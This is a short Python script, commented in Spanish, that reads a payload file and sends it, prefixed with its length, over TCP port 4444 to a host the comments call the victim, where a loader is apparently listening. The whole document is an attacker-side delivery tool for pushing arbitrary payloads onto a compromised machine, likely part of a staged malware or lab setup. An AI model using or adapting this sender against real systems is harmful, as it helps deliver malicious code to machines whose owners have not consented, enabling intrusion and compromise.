import socket
import struct
import sys

HOST = '192.168.18.244'   # IP de la víctima (donde escucha el loader)
PORT = 4444               # Puerto del loader

with open(sys.argv[1], 'rb') as f:
    payload = f.read()

size = struct.pack('<Q', len(payload))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(size + payload)
    print(f"[+] Enviados {len(payload)} bytes")
